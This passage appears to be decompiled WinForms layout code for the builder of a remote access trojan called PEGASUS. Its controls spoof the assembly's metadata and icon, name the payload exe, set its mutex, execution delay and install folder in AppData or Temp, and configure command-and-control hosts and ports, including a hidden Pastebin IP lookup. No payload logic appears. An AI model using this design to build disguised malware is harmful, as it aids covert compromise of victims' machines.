		txtOriginalFilename.HoverState.Parent = txtOriginalFilename;
		txtOriginalFilename.Location = new System.Drawing.Point(124, 180);
		txtOriginalFilename.Name = "txtOriginalFilename";
		txtOriginalFilename.PasswordChar = '\0';
		txtOriginalFilename.PlaceholderText = "";
		txtOriginalFilename.SelectedText = "";
		txtOriginalFilename.ShadowDecoration.Parent = txtOriginalFilename;
		txtOriginalFilename.Size = new System.Drawing.Size(176, 21);
		txtOriginalFilename.TabIndex = 152;
		txtCompany.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCompany.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtCompany, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtCompany, Guna.UI2.AnimatorNS.DecorationType.None);
		txtCompany.DefaultText = "";
		txtCompany.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtCompany.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtCompany.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCompany.DisabledState.Parent = txtCompany;
		txtCompany.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCompany.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtCompany.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtCompany.FocusedState.Parent = txtCompany;
		txtCompany.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtCompany.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtCompany.HoverState.Parent = txtCompany;
		txtCompany.Location = new System.Drawing.Point(124, 102);
		txtCompany.Name = "txtCompany";
		txtCompany.PasswordChar = '\0';
		txtCompany.PlaceholderText = "";
		txtCompany.SelectedText = "";
		txtCompany.ShadowDecoration.Parent = txtCompany;
		txtCompany.Size = new System.Drawing.Size(176, 21);
		txtCompany.TabIndex = 151;
		txtCopyright.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCopyright.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtCopyright, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtCopyright, Guna.UI2.AnimatorNS.DecorationType.None);
		txtCopyright.DefaultText = "";
		txtCopyright.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtCopyright.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtCopyright.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCopyright.DisabledState.Parent = txtCopyright;
		txtCopyright.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtCopyright.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtCopyright.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtCopyright.FocusedState.Parent = txtCopyright;
		txtCopyright.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtCopyright.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtCopyright.HoverState.Parent = txtCopyright;
		txtCopyright.Location = new System.Drawing.Point(124, 128);
		txtCopyright.Name = "txtCopyright";
		txtCopyright.PasswordChar = '\0';
		txtCopyright.PlaceholderText = "";
		txtCopyright.SelectedText = "";
		txtCopyright.ShadowDecoration.Parent = txtCopyright;
		txtCopyright.Size = new System.Drawing.Size(176, 21);
		txtCopyright.TabIndex = 150;
		txtTrademarks.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtTrademarks.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtTrademarks, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtTrademarks, Guna.UI2.AnimatorNS.DecorationType.None);
		txtTrademarks.DefaultText = "";
		txtTrademarks.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtTrademarks.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtTrademarks.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtTrademarks.DisabledState.Parent = txtTrademarks;
		txtTrademarks.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtTrademarks.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtTrademarks.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtTrademarks.FocusedState.Parent = txtTrademarks;
		txtTrademarks.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtTrademarks.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtTrademarks.HoverState.Parent = txtTrademarks;
		txtTrademarks.Location = new System.Drawing.Point(124, 154);
		txtTrademarks.Name = "txtTrademarks";
		txtTrademarks.PasswordChar = '\0';
		txtTrademarks.PlaceholderText = "";
		txtTrademarks.SelectedText = "";
		txtTrademarks.ShadowDecoration.Parent = txtTrademarks;
		txtTrademarks.Size = new System.Drawing.Size(176, 21);
		txtTrademarks.TabIndex = 149;
		txtDescription.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtDescription.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtDescription, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtDescription, Guna.UI2.AnimatorNS.DecorationType.None);
		txtDescription.DefaultText = "";
		txtDescription.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtDescription.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtDescription.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtDescription.DisabledState.Parent = txtDescription;
		txtDescription.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtDescription.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtDescription.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtDescription.FocusedState.Parent = txtDescription;
		txtDescription.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtDescription.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtDescription.HoverState.Parent = txtDescription;
		txtDescription.Location = new System.Drawing.Point(124, 76);
		txtDescription.Name = "txtDescription";
		txtDescription.PasswordChar = '\0';
		txtDescription.PlaceholderText = "";
		txtDescription.SelectedText = "";
		txtDescription.ShadowDecoration.Parent = txtDescription;
		txtDescription.Size = new System.Drawing.Size(176, 21);
		txtDescription.TabIndex = 148;
		txtProduct.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProduct.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtProduct, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtProduct, Guna.UI2.AnimatorNS.DecorationType.None);
		txtProduct.DefaultText = "";
		txtProduct.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtProduct.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtProduct.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProduct.DisabledState.Parent = txtProduct;
		txtProduct.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtProduct.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtProduct.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtProduct.FocusedState.Parent = txtProduct;
		txtProduct.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtProduct.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtProduct.HoverState.Parent = txtProduct;
		txtProduct.Location = new System.Drawing.Point(124, 50);
		txtProduct.Name = "txtProduct";
		txtProduct.PasswordChar = '\0';
		txtProduct.PlaceholderText = "";
		txtProduct.SelectedText = "";
		txtProduct.ShadowDecoration.Parent = txtProduct;
		txtProduct.Size = new System.Drawing.Size(176, 21);
		txtProduct.TabIndex = 147;
		chkIcon.AutoSize = true;
		chkIcon.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkIcon.CheckedState.BorderRadius = 0;
		chkIcon.CheckedState.BorderThickness = 1;
		chkIcon.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkIcon.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		chkIcon.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkIcon.Location = new System.Drawing.Point(450, 82);
		chkIcon.Name = "chkIcon";
		chkIcon.Size = new System.Drawing.Size(87, 17);
		chkIcon.TabIndex = 134;
		chkIcon.Text = "Change Icon";
		guna2HtmlToolTip1.SetToolTip(chkIcon, "Enable/Disable   Change icon of your exe!");
		chkIcon.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkIcon.UncheckedState.BorderRadius = 0;
		chkIcon.UncheckedState.BorderThickness = 1;
		chkIcon.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkIcon.CheckedChanged += new System.EventHandler(ChkIcon_CheckedChanged);
		btnAssembly.AutoSize = true;
		btnAssembly.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAssembly.CheckedState.BorderRadius = 0;
		btnAssembly.CheckedState.BorderThickness = 1;
		btnAssembly.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnAssembly.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(btnAssembly, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnAssembly, Guna.UI2.AnimatorNS.DecorationType.None);
		btnAssembly.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		btnAssembly.Location = new System.Drawing.Point(130, 82);
		btnAssembly.Name = "btnAssembly";
		btnAssembly.Size = new System.Drawing.Size(70, 17);
		btnAssembly.TabIndex = 133;
		btnAssembly.Text = "Assembly";
		guna2HtmlToolTip1.SetToolTip(btnAssembly, "Enable/Disable  Change assembly info or your exe!");
		btnAssembly.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnAssembly.UncheckedState.BorderRadius = 0;
		btnAssembly.UncheckedState.BorderThickness = 1;
		btnAssembly.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		btnAssembly.CheckedChanged += new System.EventHandler(BtnAssembly_CheckedChanged);
		tabPage2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		tabPage2.Controls.Add(guna2Separator5);
		tabPage2.Controls.Add(guna2GroupBox3);
		tabPage2.Controls.Add(chkPaste_bin);
		tabPage2.Controls.Add(checkBox1);
		guna2Transition2.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
		tabPage2.Location = new System.Drawing.Point(4, 44);
		tabPage2.Name = "tabPage2";
		tabPage2.Padding = new System.Windows.Forms.Padding(3);
		tabPage2.Size = new System.Drawing.Size(974, 465);
		tabPage2.TabIndex = 1;
		tabPage2.Text = "Installation";
		guna2Separator5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator5.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator5.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator5.Location = new System.Drawing.Point(-162, -3);
		guna2Separator5.Name = "guna2Separator5";
		guna2Separator5.Size = new System.Drawing.Size(1299, 10);
		guna2Separator5.TabIndex = 140;
		guna2Separator5.UseTransparentBackground = true;
		guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
		guna2GroupBox3.Controls.Add(txtPaste_bin);
		guna2GroupBox3.Controls.Add(txtMutex);
		guna2GroupBox3.Controls.Add(textFilename);
		guna2GroupBox3.Controls.Add(label19);
		guna2GroupBox3.Controls.Add(label18);
		guna2GroupBox3.Controls.Add(label17);
		guna2GroupBox3.Controls.Add(comboBoxFolder);
		guna2GroupBox3.Controls.Add(label16);
		guna2GroupBox3.Controls.Add(numDelay);
		guna2GroupBox3.Controls.Add(label5);
		guna2GroupBox3.Controls.Add(txtGroup);
		guna2GroupBox3.Controls.Add(label3);
		guna2GroupBox3.Controls.Add(label4);
		guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
		guna2Transition2.SetDecoration(guna2GroupBox3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GroupBox3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GroupBox3.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2GroupBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2GroupBox3.ForeColor = System.Drawing.Color.LightGray;
		guna2GroupBox3.Location = new System.Drawing.Point(162, 130);
		guna2GroupBox3.Name = "guna2GroupBox3";
		guna2GroupBox3.ShadowDecoration.Parent = guna2GroupBox3;
		guna2GroupBox3.Size = new System.Drawing.Size(567, 232);
		guna2GroupBox3.TabIndex = 139;
		guna2GroupBox3.Text = "Installation";
		txtPaste_bin.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtPaste_bin.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtPaste_bin, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtPaste_bin, Guna.UI2.AnimatorNS.DecorationType.None);
		txtPaste_bin.DefaultText = "";
		txtPaste_bin.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtPaste_bin.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtPaste_bin.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtPaste_bin.DisabledState.Parent = txtPaste_bin;
		txtPaste_bin.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtPaste_bin.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtPaste_bin.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtPaste_bin.FocusedState.Parent = txtPaste_bin;
		txtPaste_bin.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtPaste_bin.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtPaste_bin.HoverState.Parent = txtPaste_bin;
		txtPaste_bin.Location = new System.Drawing.Point(358, 71);
		txtPaste_bin.Name = "txtPaste_bin";
		txtPaste_bin.PasswordChar = '\0';
		txtPaste_bin.PlaceholderText = "";
		txtPaste_bin.SelectedText = "";
		txtPaste_bin.ShadowDecoration.Parent = txtPaste_bin;
		txtPaste_bin.Size = new System.Drawing.Size(176, 21);
		txtPaste_bin.TabIndex = 151;
		txtPaste_bin.Visible = false;
		txtMutex.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(txtMutex, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(txtMutex, Guna.UI2.AnimatorNS.DecorationType.None);
		txtMutex.DefaultText = "PEGASUSMutex_αβγδεζηθικλμνξοπρστ";
		txtMutex.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		txtMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtMutex.DisabledState.Parent = txtMutex;
		txtMutex.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		txtMutex.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		txtMutex.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtMutex.FocusedState.Parent = txtMutex;
		txtMutex.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		txtMutex.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		txtMutex.HoverState.Parent = txtMutex;
		txtMutex.Location = new System.Drawing.Point(75, 72);
		txtMutex.Name = "txtMutex";
		txtMutex.PasswordChar = '\0';
		txtMutex.PlaceholderText = "";
		txtMutex.SelectedText = "";
		txtMutex.SelectionStart = 30;
		txtMutex.ShadowDecoration.Parent = txtMutex;
		txtMutex.Size = new System.Drawing.Size(176, 21);
		txtMutex.TabIndex = 150;
		guna2HtmlToolTip1.SetToolTip(txtMutex, "Add a random mutex here!");
		textFilename.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textFilename.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(textFilename, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(textFilename, Guna.UI2.AnimatorNS.DecorationType.None);
		textFilename.DefaultText = "PEGASUS";
		textFilename.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		textFilename.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		textFilename.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textFilename.DisabledState.Parent = textFilename;
		textFilename.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textFilename.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		textFilename.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textFilename.FocusedState.Parent = textFilename;
		textFilename.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		textFilename.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textFilename.HoverState.Parent = textFilename;
		textFilename.Location = new System.Drawing.Point(75, 132);
		textFilename.Name = "textFilename";
		textFilename.PasswordChar = '\0';
		textFilename.PlaceholderText = "";
		textFilename.SelectedText = "";
		textFilename.SelectionStart = 5;
		textFilename.ShadowDecoration.Parent = textFilename;
		textFilename.Size = new System.Drawing.Size(176, 21);
		textFilename.TabIndex = 149;
		guna2HtmlToolTip1.SetToolTip(textFilename, "Give your payload a custom exe name!");
		label19.AutoSize = true;
		label19.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label19, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label19, Guna.UI2.AnimatorNS.DecorationType.None);
		label19.Location = new System.Drawing.Point(256, 138);
		label19.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label19.Name = "label19";
		label19.Size = new System.Drawing.Size(30, 15);
		label19.TabIndex = 140;
		label19.Text = ".exe";
		label18.AutoSize = true;
		label18.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label18, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label18, Guna.UI2.AnimatorNS.DecorationType.None);
		label18.Location = new System.Drawing.Point(294, 77);
		label18.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label18.Name = "label18";
		label18.Size = new System.Drawing.Size(58, 15);
		label18.TabIndex = 139;
		label18.Text = "Pastebin:";
		label18.Visible = false;
		comboBoxFolder.BackColor = System.Drawing.Color.Transparent;
		comboBoxFolder.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Transition2.SetDecoration(comboBoxFolder, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(comboBoxFolder, Guna.UI2.AnimatorNS.DecorationType.None);
		comboBoxFolder.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		comboBoxFolder.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		comboBoxFolder.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		comboBoxFolder.FocusedColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBoxFolder.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		comboBoxFolder.FocusedState.Parent = comboBoxFolder;
		comboBoxFolder.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.749999f);
		comboBoxFolder.ForeColor = System.Drawing.Color.LightGray;
		comboBoxFolder.HoverState.Parent = comboBoxFolder;
		comboBoxFolder.ItemHeight = 30;
		comboBoxFolder.Items.AddRange(new object[2] { "%AppData%", "%Temp%" });
		comboBoxFolder.ItemsAppearance.Parent = comboBoxFolder;
		comboBoxFolder.Location = new System.Drawing.Point(75, 165);
		comboBoxFolder.Name = "comboBoxFolder";
		comboBoxFolder.ShadowDecoration.Parent = comboBoxFolder;
		comboBoxFolder.Size = new System.Drawing.Size(140, 36);
		comboBoxFolder.TabIndex = 138;
		guna2HtmlToolTip1.SetToolTip(comboBoxFolder, "Select the path for your payload installation!");
		numDelay.BackColor = System.Drawing.Color.Transparent;
		numDelay.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		numDelay.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(numDelay, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(numDelay, Guna.UI2.AnimatorNS.DecorationType.None);
		numDelay.DisabledState.Parent = numDelay;
		numDelay.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		numDelay.FocusedState.Parent = numDelay;
		numDelay.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		numDelay.ForeColor = System.Drawing.Color.LightGray;
		numDelay.Location = new System.Drawing.Point(75, 101);
		numDelay.Maximum = new decimal(new int[4] { 999, 0, 0, 0 });
		numDelay.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		numDelay.Name = "numDelay";
		numDelay.ShadowDecoration.Parent = numDelay;
		numDelay.Size = new System.Drawing.Size(56, 25);
		numDelay.TabIndex = 137;
		guna2HtmlToolTip1.SetToolTip(numDelay, "Delay for the execution of your payload!");
		numDelay.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
		numDelay.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		txtGroup.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		txtGroup.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		guna2Transition1.SetDecoration(txtGroup, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(txtGroup, Guna.UI2.AnimatorNS.DecorationType.None);
		txtGroup.ForeColor = System.Drawing.Color.LightGray;
		txtGroup.Location = new System.Drawing.Point(75, 45);
		txtGroup.Margin = new System.Windows.Forms.Padding(2);
		txtGroup.Name = "txtGroup";
		txtGroup.Size = new System.Drawing.Size(110, 21);
		txtGroup.TabIndex = 110;
		txtGroup.Text = "Default";
		guna2HtmlToolTip1.SetToolTip(txtGroup, "Give your client a group name!");
		chkPaste_bin.AutoSize = true;
		chkPaste_bin.BackColor = System.Drawing.Color.Transparent;
		chkPaste_bin.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkPaste_bin.CheckedState.BorderRadius = 0;
		chkPaste_bin.CheckedState.BorderThickness = 1;
		chkPaste_bin.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkPaste_bin.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkPaste_bin, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkPaste_bin, Guna.UI2.AnimatorNS.DecorationType.None);
		chkPaste_bin.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkPaste_bin.Location = new System.Drawing.Point(272, 106);
		chkPaste_bin.Name = "chkPaste_bin";
		chkPaste_bin.Size = new System.Drawing.Size(87, 17);
		chkPaste_bin.TabIndex = 136;
		chkPaste_bin.Text = "Get ip by link";
		chkPaste_bin.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkPaste_bin.UncheckedState.BorderRadius = 0;
		chkPaste_bin.UncheckedState.BorderThickness = 1;
		chkPaste_bin.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkPaste_bin.UseVisualStyleBackColor = false;
		chkPaste_bin.Visible = false;
		chkPaste_bin.CheckedChanged += new System.EventHandler(CheckBox2_CheckedChanged);
		checkBox1.AutoSize = true;
		checkBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		checkBox1.CheckedState.BorderRadius = 0;
		checkBox1.CheckedState.BorderThickness = 1;
		checkBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		checkBox1.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(checkBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(checkBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		checkBox1.Location = new System.Drawing.Point(162, 106);
		checkBox1.Name = "checkBox1";
		checkBox1.Size = new System.Drawing.Size(99, 17);
		checkBox1.TabIndex = 135;
		checkBox1.Text = "Installation OFF";
		guna2HtmlToolTip1.SetToolTip(checkBox1, "Enable/Disable  Installation of your payload!");
		checkBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		checkBox1.UncheckedState.BorderRadius = 0;
		checkBox1.UncheckedState.BorderThickness = 1;
		checkBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
		tabPage3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		tabPage3.Controls.Add(guna2Separator4);
		tabPage3.Controls.Add(guna2GroupBox1);
		guna2Transition2.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
		tabPage3.Location = new System.Drawing.Point(4, 44);
		tabPage3.Name = "tabPage3";
		tabPage3.Padding = new System.Windows.Forms.Padding(3);
		tabPage3.Size = new System.Drawing.Size(974, 465);
		tabPage3.TabIndex = 2;
		tabPage3.Text = "Host/Port";
		guna2Separator4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator4.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator4.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator4.Location = new System.Drawing.Point(-162, -3);
		guna2Separator4.Name = "guna2Separator4";
		guna2Separator4.Size = new System.Drawing.Size(1299, 10);
		guna2Separator4.TabIndex = 127;
		guna2Separator4.UseTransparentBackground = true;
		guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
		guna2GroupBox1.Controls.Add(guna2GradientButton1);
		guna2GroupBox1.Controls.Add(btnStatic);
		guna2GroupBox1.Controls.Add(btnEx);
		guna2GroupBox1.Controls.Add(btnLocal);
		guna2GroupBox1.Controls.Add(guna2VSeparator1);
		guna2GroupBox1.Controls.Add(label21);
		guna2GroupBox1.Controls.Add(label20);
		guna2GroupBox1.Controls.Add(textPort);
		guna2GroupBox1.Controls.Add(textIP);
		guna2GroupBox1.Controls.Add(btnRemovePort);
		guna2GroupBox1.Controls.Add(btnRemoveIP);
		guna2GroupBox1.Controls.Add(btnAddPort);
		guna2GroupBox1.Controls.Add(btnAddIP);
		guna2GroupBox1.Controls.Add(listBoxPort);
		guna2GroupBox1.Controls.Add(listBoxIP);
		guna2GroupBox1.Controls.Add(guna2Separator7);
		guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
		guna2Transition2.SetDecoration(guna2GroupBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GroupBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GroupBox1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
